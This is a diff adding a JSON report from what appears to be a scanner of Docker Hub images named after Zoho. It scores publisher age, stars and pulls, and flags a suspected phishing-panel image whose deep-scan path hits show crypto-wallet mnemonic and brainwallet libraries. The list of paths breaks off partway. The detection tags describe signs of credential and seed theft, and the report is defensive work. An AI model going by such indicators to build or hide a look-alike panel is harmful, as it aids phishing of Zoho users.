@@ -1,0 +1,1236 @@
+{
+  "analysis_time_utc": "2026-09-11T10:19:54.447588Z",
+  "window_days": 90,
+  "discovered_search_repos": 297,
+  "in_window_repos": 26,
+  "records": [
+    {
+      "repo": "airbyte/source-zoho-crm",
+      "pull_count": 136979,
+      "star_count": 0,
+      "last_updated": "2026-09-11T00:06:31.72984Z",
+      "updated_days": 0.43,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:766a64bc14f54680dde2a47241bd36b5a1a3a6f824e8dbede9985c4d50abd577",
+      "layer_count": 21,
+      "cmd": null,
+      "entrypoint": [
+        "/entrypoint.sh"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "zohoanalytics/onprem",
+      "pull_count": 25944,
+      "star_count": 11,
+      "last_updated": "2026-09-04T17:18:29.396331Z",
+      "updated_days": 6.71,
+      "publisher": "zohoanalytics",
+      "publisher_joined": "2020-05-07T11:10:30.848117Z",
+      "publisher_age_days": 2318.0,
+      "description": "Zoho Analytics On-Premise is a business intelligence and analytics software",
+      "digest_or_platform_digest": "sha256:7c2cd5c822b2c52c6c6641b4e0abe48d81e3519e1fb264c499b6bc5fd6b7f0be",
+      "layer_count": 7,
+      "cmd": [
+        "/bin/sh",
+        "-c",
+        "tail -f /dev/null"
+      ],
+      "entrypoint": null,
+      "workdir": "/home/zaop",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 0,
+      "risk_reasons": []
+    },
+    {
+      "repo": "airbyte/source-zoho-books",
+      "pull_count": 22057,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:46:01.840624Z",
+      "updated_days": 3.07,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:4df5420cdd356181c44000bc5e60760f831ccc477c7e6b238f82b5172af7cbb1",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-desk",
+      "pull_count": 19308,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:59:56.502816Z",
+      "updated_days": 3.06,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:644ef90ce243a65d0909ee6f94179baf4975f1843a134b4e7a925d2e2009e85b",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-analytics-metadata-api",
+      "pull_count": 18394,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:39:56.027769Z",
+      "updated_days": 3.07,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:d20ac603140cfdefa40c22ff6399c7ed4cc19fe588a291f2c961b90a6c88c22b",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-bigin",
+      "pull_count": 17304,
+      "star_count": 0,
+      "last_updated": "2026-09-08T09:01:30.428388Z",
+      "updated_days": 3.05,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:98a76b570705d103e755fa35568714dbee62b70061c48e6feb2a19e718905ec6",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-billing",
+      "pull_count": 17149,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:56:35.524421Z",
+      "updated_days": 3.06,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:ee3f0e1bdda9e66f77a4449ee4e038bfa1540da18708eb0239eb634ca7454768",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-inventory",
+      "pull_count": 17114,
+      "star_count": 0,
+      "last_updated": "2026-09-08T09:03:52.216842Z",
+      "updated_days": 3.05,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:a82a4620353edcec0fc1d0ca9297cde76b4323e845b6575562f8a8ea13c55735",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-campaign",
+      "pull_count": 17088,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:50:29.221108Z",
+      "updated_days": 3.06,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:2b3385d608e8134c7d421d44b22beafd1f8ac236364b34fa7a04592f98a811f6",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-expense",
+      "pull_count": 16491,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:54:22.118874Z",
+      "updated_days": 3.06,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:f8742b5cf6dc734888a86788f25ec3cfb6b2b5cfce88d8ac78fe4406cb5a7b64",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "airbyte/source-zoho-invoice",
+      "pull_count": 16192,
+      "star_count": 0,
+      "last_updated": "2026-09-08T08:54:39.825119Z",
+      "updated_days": 3.06,
+      "publisher": "airbyte",
+      "publisher_joined": "2020-09-18T22:53:58.901735Z",
+      "publisher_age_days": 2183.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:de8400d8ad1bf11c1d4fdc14659c94be5df2921db9824204ba6573fb2414e50c",
+      "layer_count": 25,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "/airbyte/integration_code/main.py"
+      ],
+      "workdir": "/airbyte/integration_code",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "innotech999/zoho_be",
+      "pull_count": 6939,
+      "star_count": 0,
+      "last_updated": "2026-09-11T07:41:04.490729Z",
+      "updated_days": 0.11,
+      "publisher": "innotech999",
+      "publisher_joined": "2024-01-11T06:21:33.806851Z",
+      "publisher_age_days": 974.2,
+      "description": "",
+      "digest_or_platform_digest": "sha256:aa1428ce52758a01d61fe6e15c6168c9025896cf63a9782f33972e0a0a2d7efd",
+      "layer_count": 8,
+      "cmd": [
+        "node",
+        "dist/main.js"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "innotech999/zoho_fe",
+      "pull_count": 5889,
+      "star_count": 0,
+      "last_updated": "2026-09-11T10:16:18.027189Z",
+      "updated_days": 0.0,
+      "publisher": "innotech999",
+      "publisher_joined": "2024-01-11T06:21:33.806851Z",
+      "publisher_age_days": 974.2,
+      "description": "",
+      "digest_or_platform_digest": "sha256:4932087c59a6e0a972a56cf1de26616bcb6800a133ebae03c8a91b4ff816f024",
+      "layer_count": 10,
+      "cmd": [
+        "nginx",
+        "-g",
+        "daemon off;"
+      ],
+      "entrypoint": [
+        "/docker-entrypoint.sh"
+      ],
+      "workdir": "/",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "zohoanalytics/mcp-server",
+      "pull_count": 5061,
+      "star_count": 0,
+      "last_updated": "2026-08-03T16:49:09.182759Z",
+      "updated_days": 38.73,
+      "publisher": "zohoanalytics",
+      "publisher_joined": "2020-05-07T11:10:30.848117Z",
+      "publisher_age_days": 2318.0,
+      "description": "ZA MCP server middleware solution bridges the connection between AI agents and Zoho Analytics",
+      "digest_or_platform_digest": "sha256:c99d7e4b92447552d33293ae4398269eab84c51276f78998bb56ca9726504b75",
+      "layer_count": 10,
+      "cmd": null,
+      "entrypoint": [
+        "python",
+        "-m",
+        "src.stdio"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 1,
+      "risk_reasons": [
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "banffpaytech/zoho-payout",
+      "pull_count": 2233,
+      "star_count": 0,
+      "last_updated": "2026-09-01T13:03:54.775076Z",
+      "updated_days": 9.89,
+      "publisher": "banffpaytech",
+      "publisher_joined": "2025-07-01T19:13:25.211226Z",
+      "publisher_age_days": 436.6,
+      "description": "",
+      "digest_or_platform_digest": "sha256:db06f22f59438546a28842a38c647d9f13b97a02b81ce699123778af70a23b29",
+      "layer_count": 8,
+      "cmd": null,
+      "entrypoint": [
+        "java",
+        "-jar",
+        "app.jar"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "senzr/zoho-books",
+      "pull_count": 1913,
+      "star_count": 0,
+      "last_updated": "2026-09-07T11:51:50.994627Z",
+      "updated_days": 3.94,
+      "publisher": "senzr",
+      "publisher_joined": "2025-10-20T05:22:02.15413Z",
+      "publisher_age_days": 326.2,
+      "description": "",
+      "digest_or_platform_digest": "sha256:170e4db50bec470bc3ee70cc187acdf57879e59e6f6c0cfe28bbba201d952821",
+      "layer_count": 8,
+      "cmd": [
+        "npm",
+        "start"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "andlo2021/zoho-mcp-api",
+      "pull_count": 1383,
+      "star_count": 0,
+      "last_updated": "2026-07-08T14:18:59.835455Z",
+      "updated_days": 64.83,
+      "publisher": "andlo2021",
+      "publisher_joined": "2021-07-29T01:31:14.602097Z",
+      "publisher_age_days": 1870.4,
+      "description": "",
+      "digest_or_platform_digest": null,
+      "layer_count": 0,
+      "cmd": null,
+      "entrypoint": null,
+      "workdir": null,
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "bilal5081850/zoho-advance-reporting",
+      "pull_count": 1363,
+      "star_count": 0,
+      "last_updated": "2026-08-07T06:59:50.230701Z",
+      "updated_days": 35.14,
+      "publisher": "bilal5081850",
+      "publisher_joined": "2022-04-12T10:30:12.786075Z",
+      "publisher_age_days": 1613.0,
+      "description": "",
+      "digest_or_platform_digest": "sha256:0b285653463719e9da710d693c9ce73740223ece77f0f922b0b366208438e806",
+      "layer_count": 10,
+      "cmd": null,
+      "entrypoint": [
+        "dotnet",
+        "WebApi.dll"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "renormalize/zoho-projects-source",
+      "pull_count": 954,
+      "star_count": 0,
+      "last_updated": "2026-09-07T12:04:25.405138Z",
+      "updated_days": 3.93,
+      "publisher": "renormalize",
+      "publisher_joined": "2023-04-23T01:13:56.220591Z",
+      "publisher_age_days": 1237.4,
+      "description": "",
+      "digest_or_platform_digest": "sha256:438904caea6d902347fadea5f43656ea301e3307b609c1a21aaef6b0cbce470a",
+      "layer_count": 15,
+      "cmd": null,
+      "entrypoint": [
+        "/home/etl/main"
+      ],
+      "workdir": "/home/etl",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "senzr/zoho",
+      "pull_count": 858,
+      "star_count": 0,
+      "last_updated": "2026-07-15T10:27:39.852064Z",
+      "updated_days": 57.99,
+      "publisher": "senzr",
+      "publisher_joined": "2025-10-20T05:22:02.15413Z",
+      "publisher_age_days": 326.2,
+      "description": "",
+      "digest_or_platform_digest": "sha256:a9a4b96ef7977d791ee9f67a5ed0008f830588134df9483f77f96e923c1a9b44",
+      "layer_count": 8,
+      "cmd": [
+        "npm",
+        "start"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "senzr/zoho-email-send",
+      "pull_count": 720,
+      "star_count": 0,
+      "last_updated": "2026-07-15T10:27:25.764017Z",
+      "updated_days": 57.99,
+      "publisher": "senzr",
+      "publisher_joined": "2025-10-20T05:22:02.15413Z",
+      "publisher_age_days": 326.2,
+      "description": "",
+      "digest_or_platform_digest": "sha256:9d7710c4cf7fe0932bb131abe24b1fe8143edfc1d596ad18814cddd44fedade2",
+      "layer_count": 8,
+      "cmd": [
+        "npm",
+        "start"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": "/app",
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "kenflorian/zoho-code-dev",
+      "pull_count": 625,
+      "star_count": 0,
+      "last_updated": "2026-07-19T19:41:16.600646Z",
+      "updated_days": 53.61,
+      "publisher": "kenflorian",
+      "publisher_joined": "2026-01-13T21:13:03.263123Z",
+      "publisher_age_days": 240.5,
+      "description": "",
+      "digest_or_platform_digest": "sha256:01dcea3c8111bd117c93860790588b5a3989ab07b9042825527bae8a4d9d0e33",
+      "layer_count": 23,
+      "cmd": [
+        "node"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": null,
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "banffpaytech/zoho-payout-prod",
+      "pull_count": 568,
+      "star_count": 0,
+      "last_updated": "2026-09-03T13:16:37.702485Z",
+      "updated_days": 7.88,
+      "publisher": "banffpaytech",
+      "publisher_joined": "2025-07-01T19:13:25.211226Z",
+      "publisher_age_days": 436.6,
+      "description": "",
+      "digest_or_platform_digest": null,
+      "layer_count": 0,
+      "cmd": null,
+      "entrypoint": null,
+      "workdir": null,
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "empty_description",
+        "zero_stars"
+      ]
+    },
+    {
+      "repo": "vishnurajvishwakarma/zohobooksingestion",
+      "pull_count": 344,
+      "star_count": 0,
+      "last_updated": "2026-09-05T13:36:47.038418Z",
+      "updated_days": 5.86,
+      "publisher": "vishnurajvishwakarma",
+      "publisher_joined": "2026-06-18T22:04:28.276984Z",
+      "publisher_age_days": 84.5,
+      "description": "Zoho Books Ingestion IMG",
+      "digest_or_platform_digest": "sha256:8cc30256e9c83b2d3a7d5d23e2c278f16510d0e4504195a82f178f0ae8d64ed3",
+      "layer_count": 15,
+      "cmd": [
+        "pnpm",
+        "start"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": "/app/services/zoho-ingestion",
+      "hist_flags": [],
+      "risk": "medium",
+      "risk_score": 4,
+      "risk_reasons": [
+        "newish_publisher",
+        "zero_stars",
+        "low_pull_count"
+      ]
+    },
+    {
+      "repo": "kpa90/zoho-mail-api-backup",
+      "pull_count": 278,
+      "star_count": 0,
+      "last_updated": "2026-09-03T08:47:40.236269Z",
+      "updated_days": 8.06,
+      "publisher": "kpa90",
+      "publisher_joined": "2022-07-28T20:43:48.596306Z",
+      "publisher_age_days": 1505.6,
+      "description": "Backup skrzynki Zoho Mail do .eml + cykliczny zip. Przyrostowo, bez zaleznosci.",
+      "digest_or_platform_digest": "sha256:247969491f278927e2637f01441e2768cadd153da6bede250974ca469c31bdde",
+      "layer_count": 5,
+      "cmd": [
+        "python",
+        "/backup.py"
+      ],
+      "entrypoint": null,
+      "workdir": null,
+      "hist_flags": [],
+      "risk": "low",
+      "risk_score": 2,
+      "risk_reasons": [
+        "zero_stars",
+        "low_pull_count"
+      ]
+    },
+    {
+      "repo": "zohomail/nexus-panel",
+      "pull_count": 204,
+      "star_count": 0,
+      "last_updated": "2026-09-05T17:43:51.186628Z",
+      "updated_days": 5.69,
+      "publisher": "zohomail",
+      "publisher_joined": "2026-09-05T17:37:39.353727Z",
+      "publisher_age_days": 5.7,
+      "description": "",
+      "digest_or_platform_digest": "sha256:ec883e693d95d27423b19e71a56b6ab74395d1a2f18cdd03fcc2daba25e1c9b4",
+      "layer_count": 13,
+      "cmd": [
+        "sh",
+        "-c",
+        "uvicorn server.main:app --host 0.0.0.0 --port ${PORT:-10000} --ws-ping-interval 0"
+      ],
+      "entrypoint": null,
+      "workdir": "/app",
+      "hist_flags": [
+        "uvicorn_server_main",
+        "playwright_chromium"
+      ],
+      "risk": "high",
+      "risk_score": 9,
+      "risk_reasons": [
+        "very_new_publisher",
+        "empty_description",
+        "zero_stars",
+        "low_pull_count",
+        "panel_like_runtime_stack"
+      ]
+    }
+  ],
+  "flagged": [
+    {
+      "repo": "vishnurajvishwakarma/zohobooksingestion",
+      "pull_count": 344,
+      "star_count": 0,
+      "last_updated": "2026-09-05T13:36:47.038418Z",
+      "updated_days": 5.86,
+      "publisher": "vishnurajvishwakarma",
+      "publisher_joined": "2026-06-18T22:04:28.276984Z",
+      "publisher_age_days": 84.5,
+      "description": "Zoho Books Ingestion IMG",
+      "digest_or_platform_digest": "sha256:8cc30256e9c83b2d3a7d5d23e2c278f16510d0e4504195a82f178f0ae8d64ed3",
+      "layer_count": 15,
+      "cmd": [
+        "pnpm",
+        "start"
+      ],
+      "entrypoint": [
+        "docker-entrypoint.sh"
+      ],
+      "workdir": "/app/services/zoho-ingestion",
+      "hist_flags": [],
+      "risk": "medium",
+      "risk_score": 4,
+      "risk_reasons": [
+        "newish_publisher",
+        "zero_stars",
+        "low_pull_count"
+      ]
+    },
+    {
+      "repo": "zohomail/nexus-panel",
+      "pull_count": 204,
+      "star_count": 0,
+      "last_updated": "2026-09-05T17:43:51.186628Z",
+      "updated_days": 5.69,
+      "publisher": "zohomail",
+      "publisher_joined": "2026-09-05T17:37:39.353727Z",
+      "publisher_age_days": 5.7,
+      "description": "",
+      "digest_or_platform_digest": "sha256:ec883e693d95d27423b19e71a56b6ab74395d1a2f18cdd03fcc2daba25e1c9b4",
+      "layer_count": 13,
+      "cmd": [
+        "sh",
+        "-c",
+        "uvicorn server.main:app --host 0.0.0.0 --port ${PORT:-10000} --ws-ping-interval 0"
+      ],
+      "entrypoint": null,
+      "workdir": "/app",
+      "hist_flags": [
+        "uvicorn_server_main",
+        "playwright_chromium"
+      ],
+      "risk": "high",
+      "risk_score": 9,
+      "risk_reasons": [
+        "very_new_publisher",
+        "empty_description",
+        "zero_stars",
+        "low_pull_count",
+        "panel_like_runtime_stack"
+      ]
+    }
+  ],
+  "deep_scan": {
+    "vishnurajvishwakarma/zohobooksingestion": {
+      "path_hits": [],
+      "content_hits": [
+        {
+          "tag": "smtp_campaign",
+          "file": "app/node_modules/.pnpm/mime-db@1.52.0/node_modules/mime-db/db.json",
+          "snippet": "net-xdd+zip\": {     \"source\": \"iana\",     \"compressible\": false   },   \"application/batch-smtp\": {     \"source\": \"iana\"   },   \"application/bdoc\": {     \"compressible\": false,     \"extensions\": [\"bdoc\"]   },   \"application/beep+xml\": {     \"source\": \"iana\",     \"charset\": \""
+        }
+      ],
+      "errors": null
+    },
+    "zohomail/nexus-panel": {
+      "path_hits": [
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__init__.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/__init__.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_entropy_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_mnemonic.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_mnemonic_decoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_mnemonic_encoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_mnemonic_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_mnemonic_utils.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_mnemonic_validator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/__pycache__/algorand_seed_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_entropy_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_mnemonic.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_mnemonic_decoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_mnemonic_encoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_mnemonic_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_mnemonic_utils.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_mnemonic_validator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/algorand/mnemonic/algorand_seed_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/__pycache__/bip39_mnemonic.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/__pycache__/bip39_mnemonic_decoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/__pycache__/bip39_mnemonic_encoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/__pycache__/bip39_mnemonic_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/__pycache__/bip39_mnemonic_utils.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/__pycache__/bip39_mnemonic_validator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/bip39_mnemonic.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/bip39_mnemonic_decoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/bip39_mnemonic_encoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/bip39_mnemonic_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/bip39_mnemonic_utils.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/bip/bip39/bip39_mnemonic_validator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__init__.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__pycache__",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__pycache__/__init__.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__pycache__/brainwallet.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__pycache__/brainwallet_algo.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__pycache__/brainwallet_algo_getter.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/__pycache__/ibrainwallet_algo.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/brainwallet.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/brainwallet_algo.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/brainwallet_algo_getter.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/brainwallet/ibrainwallet_algo.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/__init__.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/__pycache__",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/__pycache__/__init__.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/__pycache__/cardano_byron_legacy_seed_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/__pycache__/cardano_icarus_seed_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/cardano_byron_legacy_seed_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/cardano/mnemonic/cardano_icarus_seed_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__init__.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/__init__.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_entropy_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_mnemonic.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_mnemonic_decoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_mnemonic_encoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_mnemonic_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_mnemonic_utils.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_mnemonic_validator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/__pycache__/electrum_v1_seed_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_entropy_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_mnemonic.py",
